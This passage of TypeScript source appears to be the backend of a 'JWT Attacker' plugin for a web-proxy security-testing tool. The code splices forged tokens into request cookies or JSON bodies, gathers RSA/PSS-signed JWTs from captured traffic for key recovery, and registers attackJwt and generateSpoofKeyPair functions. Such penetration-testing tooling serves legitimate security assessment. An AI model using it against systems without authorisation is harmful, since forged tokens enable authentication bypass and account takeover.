    clone.setHeader("Cookie", newCookie);
  } else if (loc.type === "body-json" && loc.jsonKey) {
    const body = clone.getBody?.();
    if (body) {
      try {
        const text = typeof body.toText === "function" ? body.toText() : body.toString();
        const json = JSON.parse(text) as Record<string, unknown>;
        json[loc.jsonKey] = newJWT;
        clone.setBody(JSON.stringify(json));
      } catch { /* ignore */ }
    }
  }

  return clone;
}

async function bodyToText(body: unknown): Promise<string> {
  if (typeof body === "string") return body;
  if (body && typeof (body as { toText?: () => string }).toText === "function") {
    return (body as { toText: () => string }).toText();
  }
  if (body && typeof (body as { toRaw?: () => Uint8Array }).toRaw === "function") {
    return Buffer.from((body as { toRaw: () => Uint8Array }).toRaw()).toString("utf8");
  }
  return "";
}

function flattenHeaders(headers: Record<string, string[]>): Record<string, string> {
  const out: Record<string, string> = {};
  for (const [k, vs] of Object.entries(headers)) {
    out[k] = vs.join(", ");
  }
  return out;
}

async function collectHistoryJWTs(
  sdk: SDK<API, BackendEvents>,
  host: string,
  limit: number
): Promise<ParsedJWT[]> {
  const results: ParsedJWT[] = [];
  const seenSig = new Set<string>();
  try {
    const page = await sdk.requests
      .query()
      .filter(`req.host.eq:"${host}"`)
      .descending("req", "id")
      .first(limit)
      .execute();

    // RequestsConnection — cast to access items array
    const conn = page as unknown as {
      items?: Array<{ request?: { toSpec(): unknown; getSource?(): string } }>;
    };
    for (const item of conn.items ?? []) {
      if (!item.request) continue;
      // Only use genuine captured traffic. Skip Replay/Automate/Workflow-sourced
      // requests (these include the analyst's replays and our own forged tokens).
      const src = (item.request.getSource?.() ?? "").toLowerCase();
      if (src.includes("replay") || src.includes("automate") || src.includes("workflow")) continue;

      const spec = item.request.toSpec() as unknown as IRequestSpec;
      const locs = findJWTsInSpec(spec);
      for (const loc of locs) {
        try {
          const parsed = parseJWT(loc.jwt);
          const fam = getAlgorithmFamily(parsed.header.alg as string);
          if (!(fam === "RS" || fam === "PS") || !parsed.signatureB64) continue;
          // Skip our own spoofing tokens, and de-duplicate by signature —
          // recovery needs JWTs with *distinct* signatures under the same key.
          if (parsed.header.kid === SPOOF_KID) continue;
          if (seenSig.has(parsed.signatureB64)) continue;
          seenSig.add(parsed.signatureB64);
          results.push(parsed);
          if (results.length >= 10) return results;
        } catch { /* ignore */ }
      }
    }
  } catch { /* ignore */ }
  return results;
}

// ─── API definition ─────────────────────────────────────────────────────────

export type API = DefineAPI<{
  attackJwt: typeof attackJwt;
  getJWTsInRequest: typeof getJWTsInRequest;
  generateSpoofKeyPair: typeof generateSpoofKeyPair;
}>;

export function init(sdk: SDK<API, BackendEvents>): void {
  sdk.console.log("[JWT Attacker] backend init() called");
  sdk.api.register("attackJwt", attackJwt);
  sdk.api.register("getJWTsInRequest", getJWTsInRequest);
  sdk.api.register("generateSpoofKeyPair", generateSpoofKeyPair);
  sdk.console.log("[JWT Attacker] backend init() complete");
}
